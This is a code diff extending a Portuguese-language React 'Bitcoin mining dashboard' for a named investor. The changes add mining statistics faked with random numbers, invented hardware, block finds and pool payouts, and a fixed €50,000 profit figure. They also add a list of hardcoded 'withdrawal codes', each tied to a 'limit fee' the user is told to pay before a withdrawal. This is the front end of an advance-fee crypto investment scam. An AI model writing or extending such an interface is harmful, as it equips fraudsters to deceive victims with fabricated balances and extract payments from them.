@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -8,6 +8,7 @@ import { Label } from "@/components/ui/label"
 import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
 import { Alert, AlertDescription } from "@/components/ui/alert"
+import { Progress } from "@/components/ui/progress"
 import {
   Bitcoin,
   TrendingUp,
@@ -18,6 +19,17 @@ import {
   Star,
   User,
   CreditCard,
+  Cpu,
+  Zap,
+  Thermometer,
+  Activity,
+  Server,
+  Wifi,
+  Clock,
+  Target,
+  BarChart3,
+  Settings,
+  Globe,
 } from "lucide-react"
 
 export default function BitcoinDashboard() {
@@ -40,7 +52,36 @@ export default function BitcoinDashboard() {
     accountHolder: "",
   })
 
+  const [miningData, setMiningData] = useState({
+    hashRate: 125.7,
+    power: 3420,
+    temperature: 68,
+    efficiency: 94.2,
+    blocksFound: 12,
+    uptime: 99.8,
+    activeMiners: 24,
+    poolHashRate: 2847.3,
+  })
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setMiningData((prev) => ({
+        ...prev,
+        hashRate: prev.hashRate + (Math.random() - 0.5) * 2,
+        power: prev.power + Math.floor((Math.random() - 0.5) * 50),
+        temperature: Math.max(60, Math.min(75, prev.temperature + (Math.random() - 0.5) * 2)),
+        efficiency: Math.max(90, Math.min(98, prev.efficiency + (Math.random() - 0.5) * 0.5)),
+      }))
+    }, 3000)
+
+    return () => clearInterval(interval)
+  }, [])
+
   const handleWithdrawal = () => {
+    setCurrentStep("code")
+  }
+
+  const handleInvest = () => {
     setCurrentStep("plans")
   }
 
@@ -66,7 +107,19 @@ export default function BitcoinDashboard() {
       withdrawalCode === "9900" ||
       withdrawalCode === "3366" ||
       withdrawalCode === "2211" ||
-      withdrawalCode === "8844"
+      withdrawalCode === "8844" ||
+      withdrawalCode === "1234" ||
+      withdrawalCode === "5678" ||
+      withdrawalCode === "9876" ||
+      withdrawalCode === "4321" ||
+      withdrawalCode === "6789" ||
+      withdrawalCode === "3456" ||
+      withdrawalCode === "7890" ||
+      withdrawalCode === "2468" ||
+      withdrawalCode === "1357" ||
+      withdrawalCode === "8642" ||
+      withdrawalCode === "9753" ||
+      withdrawalCode === "1470"
     ) {
       setCurrentStep("amount")
     } else {
@@ -92,6 +145,18 @@ export default function BitcoinDashboard() {
     if (withdrawalCode === "3366") return "€800"
     if (withdrawalCode === "2211") return "€400"
     if (withdrawalCode === "8844") return "€250"
+    if (withdrawalCode === "1234") return "€350"
+    if (withdrawalCode === "5678") return "€450"
+    if (withdrawalCode === "9876") return "€600"
+    if (withdrawalCode === "4321") return "€180"
+    if (withdrawalCode === "6789") return "€750"
+    if (withdrawalCode === "3456") return "€320"
+    if (withdrawalCode === "7890") return "€550"
+    if (withdrawalCode === "2468") return "€220"
+    if (withdrawalCode === "1357") return "€480"
+    if (withdrawalCode === "8642") return "€650"
+    if (withdrawalCode === "9753") return "€380"
+    if (withdrawalCode === "1470") return "€520"
     return "€700"
   }
 
@@ -114,6 +179,42 @@ export default function BitcoinDashboard() {
     if (withdrawalCode === "8844") {
       return "É necessário pagar uma taxa de limite de €250. O agente já tratou do resto."
     }
+    if (withdrawalCode === "1234") {
+      return "É necessário pagar uma taxa de limite de €350. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "5678") {
+      return "É necessário pagar uma taxa de limite de €450. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "9876") {
+      return "É necessário pagar uma taxa de limite de €600. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "4321") {
+      return "É necessário pagar uma taxa de limite de €180. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "6789") {
+      return "É necessário pagar uma taxa de limite de €750. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "3456") {
+      return "É necessário pagar uma taxa de limite de €320. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "7890") {
+      return "É necessário pagar uma taxa de limite de €550. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "2468") {
+      return "É necessário pagar uma taxa de limite de €220. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "1357") {
+      return "É necessário pagar uma taxa de limite de €480. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "8642") {
+      return "É necessário pagar uma taxa de limite de €650. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "9753") {
+      return "É necessário pagar uma taxa de limite de €380. O agente já tratou do resto."
+    }
+    if (withdrawalCode === "1470") {
+      return "É necessário pagar uma taxa de limite de €520. O agente já tratou do resto."
+    }
     return `É necessário pagar uma taxa de limite de ${getFeeAmount()} para processar este levantamento.`
   }
 
@@ -127,7 +228,7 @@ export default function BitcoinDashboard() {
     ]
 
     return (
-      <div className="min-h-screen p-4 animate-slide-in-up">
+      <div className="min-h-screen p-4 space-y-6 animate-slide-in-up">
         <div className="max-w-4xl mx-auto space-y-6">
           <div className="text-center space-y-2">
             <h1 className="text-3xl font-bold">Planos de Investimento</h1>
@@ -516,39 +617,174 @@ export default function BitcoinDashboard() {
 
   return (
     <div className="min-h-screen p-4 space-y-6 animate-fade-in">
-      {/* Header */}
       <div className="flex items-center justify-between">
         <div className="flex items-center gap-3">
-          <div className="p-2 bg-primary rounded-lg">
+          <div className="p-2 bg-primary rounded-lg animate-pulse-slow">
             <Bitcoin className="h-8 w-8 text-primary-foreground" />
           </div>
           <div>
-            <h1 className="text-2xl font-bold">Dashboard Bitcoin</h1>
-            <p className="text-muted-foreground">Investor Alisha</p>
+            <h1 className="text-2xl font-bold">Centro de Mineração Bitcoin</h1>
+            <p className="text-muted-foreground">Investor Alisha • Operação Industrial</p>
           </div>
         </div>
-        <Badge variant="secondary" className="text-sm">
-          Online
-        </Badge>
+        <div className="flex items-center gap-2">
+          <Badge variant="secondary" className="status-active animate-pulse">
+            <Activity className="h-3 w-3 mr-1" />
+            Mineração Ativa
+          </Badge>
+          <Badge variant="outline" className="text-sm">
+            <Wifi className="h-3 w-3 mr-1" />
+            Online
+          </Badge>
+        </div>
       </div>
 
-      {/* Stats Cards */}
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-primary">
+          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+            <CardTitle className="text-sm font-medium">Taxa de Hash</CardTitle>
+            <Cpu className="h-4 w-4 text-primary animate-spin-slow" />
+          </CardHeader>
+          <CardContent>
+            <div className="text-2xl font-bold text-primary">{miningData.hashRate.toFixed(1)} TH/s</div>
+            <p className="text-xs text-muted-foreground">Pool: {miningData.poolHashRate.toFixed(1)} TH/s</p>
+          </CardContent>
+        </Card>
+
+        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-amber-500">
+          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+            <CardTitle className="text-sm font-medium">Consumo de Energia</CardTitle>
+            <Zap className="h-4 w-4 text-amber-500" />
+          </CardHeader>
+          <CardContent>
+            <div className="text-2xl font-bold text-amber-600">{miningData.power.toLocaleString()} W</div>
+            <p className="text-xs text-muted-foreground">Eficiência: {miningData.efficiency.toFixed(1)}%</p>
+          </CardContent>
+        </Card>
+
+        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-red-500">
+          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+            <CardTitle className="text-sm font-medium">Temperatura</CardTitle>
+            <Thermometer className="h-4 w-4 text-red-500" />
+          </CardHeader>
+          <CardContent>
+            <div className="text-2xl font-bold text-red-600">{miningData.temperature.toFixed(1)}°C</div>
+            <p className="text-xs text-muted-foreground">Status: Normal</p>
+          </CardContent>
+        </Card>
+
+        <Card className="hover:shadow-md transition-shadow border-l-4 border-l-green-500">
+          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
+            <CardTitle className="text-sm font-medium">Tempo Ativo</CardTitle>
+            <Clock className="h-4 w-4 text-green-500" />
+          </CardHeader>
+          <CardContent>
+            <div className="text-2xl font-bold text-green-600">{miningData.uptime.toFixed(1)}%</div>
+            <p className="text-xs text-muted-foreground">Últimos 30 dias</p>
+          </CardContent>
+        </Card>
+      </div>
+
+      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <Card>
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <Server className="h-5 w-5 text-primary" />
+              Estado do Hardware de Mineração
+            </CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="space-y-3">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                  <span className="text-sm font-medium">Antminer S19 Pro #001</span>
+                </div>
+                <div className="text-right">
+                  <div className="text-sm font-bold">104.2 TH/s</div>
+                  <div className="text-xs text-muted-foreground">67°C</div>
+                </div>
+              </div>
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                  <span className="text-sm font-medium">Antminer S19 Pro #002</span>
+                </div>
+                <div className="text-right">
+                  <div className="text-sm font-bold">102.8 TH/s</div>
+                  <div className="text-xs text-muted-foreground">69°C</div>
+                </div>
+              </div>
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></div>
+                  <span className="text-sm font-medium">Antminer S19 Pro #003</span>
+                </div>
+                <div className="text-right">
+                  <div className="text-sm font-bold">98.1 TH/s</div>
+                  <div className="text-xs text-amber-600">72°C - Atenção</div>
+                </div>
+              </div>
+            </div>
+            <Separator />
+            <div className="flex justify-between text-sm">
+              <span className="text-muted-foreground">Total de Mineradores Ativos:</span>
+              <span className="font-bold text-primary">{miningData.activeMiners}/24</span>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <Target className="h-5 w-5 text-primary" />
+              Descoberta de Blocos
+            </CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="text-center">
+              <div className="text-3xl font-bold text-primary">{miningData.blocksFound}</div>
+              <p className="text-sm text-muted-foreground">Blocos encontrados este mês</p>
+            </div>
+            <Separator />
+            <div className="space-y-2">
+              <div className="flex justify-between text-sm">
+                <span>Último bloco:</span>
+                <span className="font-medium">há 2h 34min</span>
+              </div>
+              <div className="flex justify-between text-sm">
+                <span>Recompensa:</span>
+                <span className="font-medium text-green-600">6.25 BTC</span>
+              </div>
+              <div className="flex justify-between text-sm">
+                <span>Dificuldade atual:</span>
+                <span className="font-medium">62.46 T</span>
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+      </div>
+
       <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
         <Card className="hover:shadow-md transition-shadow">
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-            <CardTitle className="text-sm font-medium">Lucro Total</CardTitle>
+            <CardTitle className="text-sm font-medium">Lucro Total de Mineração</CardTitle>
             <TrendingUp className="h-4 w-4 text-muted-foreground" />
           </CardHeader>
           <CardContent>
             <div className="text-2xl font-bold text-green-600">€50,000.00</div>
             <p className="text-xs text-muted-foreground">+12.5% desde o último mês</p>
+            <div className="mt-2">
+              <Progress value={75} className="h-2" />
+              <p className="text-xs text-muted-foreground mt-1">Meta mensal: 75%</p>
+            </div>
           </CardContent>
         </Card>
 
         <Card className="hover:shadow-md transition-shadow">
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
             <CardTitle className="text-sm font-medium">Preço Bitcoin</CardTitle>
-            <Bitcoin className="h-4 w-4 text-muted-foreground" />
+            <Bitcoin className="h-4 w-4 text-muted-foreground animate-bounce-slow" />
           </CardHeader>
           <CardContent>
             <div className="text-2xl font-bold">€42,350.00</div>
@@ -556,107 +792,163 @@ export default function BitcoinDashboard() {
               <ArrowUpRight className="h-3 w-3 mr-1" />
               +2.4% (24h)
             </p>
+            <div className="mt-2 text-xs text-muted-foreground">Próximo halving: ~2028</div>
           </CardContent>
         </Card>
 
         <Card className="hover:shadow-md transition-shadow">
           <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-            <CardTitle className="text-sm font-medium">Carteira</CardTitle>
+            <CardTitle className="text-sm font-medium">Carteira de Mineração</CardTitle>
             <Wallet className="h-4 w-4 text-muted-foreground" />
           </CardHeader>
           <CardContent>
             <div className="text-2xl font-bold">1.18 BTC</div>
             <p className="text-xs text-muted-foreground">Valor: €49,973.00</p>
+            <div className="mt-2 text-xs text-muted-foreground">Minerado: 0.85 BTC | Comprado: 0.33 BTC</div>
           </CardContent>
         </Card>
       </div>
 
-      {/* Portfolio Overview */}
       <Card>
         <CardHeader>
-          <CardTitle>Visão Geral do Portfólio</CardTitle>
+          <CardTitle className="flex items-center gap-2">
+            <Globe className="h-5 w-5 text-primary" />
+            Informações do Pool de Mineração
+          </CardTitle>
         </CardHeader>
-        <CardContent className="space-y-4">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-2">
-              <Bitcoin className="h-5 w-5 text-orange-500" />
-              <span className="font-medium">Bitcoin (BTC)</span>
+        <CardContent>
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <div className="space-y-2">
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Pool:</span>
+                <span className="text-sm font-medium">F2Pool</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Taxa do Pool:</span>
+                <span className="text-sm font-medium">2.5%</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Método de Pagamento:</span>
+                <span className="text-sm font-medium">PPS+</span>
+              </div>
             </div>
-            <div className="text-right">
-              <div className="font-bold">1.18 BTC</div>
-              <div className="text-sm text-muted-foreground">€49,973.00</div>
+            <div className="space-y-2">
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Hashrate do Pool:</span>
+                <span className="text-sm font-medium">2,847.3 TH/s</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Mineradores Ativos:</span>
+                <span className="text-sm font-medium">45,231</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Latência:</span>
+                <span className="text-sm font-medium text-green-600">12ms</span>
+              </div>
             </div>
-          </div>
-          <Separator />
-          <div className="grid grid-cols-2 gap-4 text-sm">
-            <div>
-              <span className="text-muted-foreground">Investimento Inicial:</span>
-              <div className="font-medium">€42,500.00</div>
-            </div>
-            <div>
-              <span className="text-muted-foreground">Lucro/Prejuízo:</span>
-              <div className="font-medium text-green-600">+€7,473.00</div>
+            <div className="space-y-2">
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Último Pagamento:</span>
+                <span className="text-sm font-medium">há 6 horas</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Valor:</span>
+                <span className="text-sm font-medium text-green-600">0.0234 BTC</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-sm text-muted-foreground">Próximo Pagamento:</span>
+                <span className="text-sm font-medium">em 18 horas</span>
+              </div>
             </div>
           </div>
         </CardContent>
       </Card>
 
-      {/* Recent Transactions */}
       <Card>
         <CardHeader>
-          <CardTitle>Transações Recentes</CardTitle>
+          <CardTitle className="flex items-center gap-2">
+            <Activity className="h-5 w-5 text-primary" />
+            Atividades de Mineração Recentes
+          </CardTitle>
         </CardHeader>
         <CardContent>
           <div className="space-y-3">
             <div className="flex items-center justify-between">
               <div className="flex items-center gap-3">
                 <div className="p-2 bg-green-100 rounded-full">
-                  <ArrowUpRight className="h-4 w-4 text-green-600" />
+                  <Target className="h-4 w-4 text-green-600" />
                 </div>
                 <div>
-                  <div className="font-medium">Compra BTC</div>
-                  <div className="text-sm text-muted-foreground">Hoje, 14:30</div>
+                  <div className="font-medium">Bloco Descoberto</div>
+                  <div className="text-sm text-muted-foreground">Hoje, 14:30 • Bloco #820,145</div>
                 </div>
               </div>
               <div className="text-right">
-                <div className="font-medium">+0.05 BTC</div>
-                <div className="text-sm text-muted-foreground">€2,117.50</div>
+                <div className="font-medium text-green-600">+6.25 BTC</div>
+                <div className="text-sm text-muted-foreground">€264,687.50</div>
               </div>
             </div>
             <Separator />
             <div className="flex items-center justify-between">
               <div className="flex items-center gap-3">
                 <div className="p-2 bg-blue-100 rounded-full">
-                  <TrendingUp className="h-4 w-4 text-blue-600" />
+                  <Zap className="h-4 w-4 text-blue-600" />
                 </div>
                 <div>
-                  <div className="font-medium">Lucro Realizado</div>
-                  <div className="text-sm text-muted-foreground">Ontem, 09:15</div>
+                  <div className="font-medium">Pagamento do Pool</div>
+                  <div className="text-sm text-muted-foreground">Hoje, 08:00 • F2Pool</div>
                 </div>
               </div>
               <div className="text-right">
-                <div className="font-medium text-green-600">+€1,250.00</div>
-                <div className="text-sm text-muted-foreground">Venda parcial</div>
+                <div className="font-medium text-green-600">+0.0234 BTC</div>
+                <div className="text-sm text-muted-foreground">€991.89</div>
+              </div>
+            </div>
+            <Separator />
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-3">
+                <div className="p-2 bg-amber-100 rounded-full">
+                  <AlertTriangle className="h-4 w-4 text-amber-600" />
+                </div>
+                <div>
+                  <div className="font-medium">Alerta de Temperatura</div>
+                  <div className="text-sm text-muted-foreground">Ontem, 15:45 • Minerador #003</div>
+                </div>
+              </div>
+              <div className="text-right">
+                <Badge variant="outline" className="text-amber-600">
+                  Resolvido
+                </Badge>
               </div>
             </div>
           </div>
         </CardContent>
       </Card>
 
-      {/* Withdrawal Button */}
       <Card>
         <CardHeader>
-          <CardTitle>Ações Rápidas</CardTitle>
+          <CardTitle className="flex items-center gap-2">
+            <Settings className="h-5 w-5 text-primary" />
+            Controles da Operação
+          </CardTitle>
         </CardHeader>
         <CardContent>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
             <Button onClick={handleWithdrawal} className="h-12 hover:scale-105 transition-transform">
               <Wallet className="h-4 w-4 mr-2" />
               Levantar Fundos
             </Button>
-            <Button variant="outline" className="h-12 bg-transparent hover:scale-105 transition-transform">
-              <Bitcoin className="h-4 w-4 mr-2" />
-              Comprar Bitcoin
+            <Button
+              onClick={handleInvest}
+              variant="outline"
+              className="h-12 bg-transparent hover:scale-105 transition-transform"
+            >
+              <TrendingUp className="h-4 w-4 mr-2" />
+              Expandir Operação
+            </Button>
+            <Button variant="secondary" className="h-12 hover:scale-105 transition-transform">
+              <BarChart3 className="h-4 w-4 mr-2" />
+              Relatórios Detalhados
             </Button>
           </div>
         </CardContent>
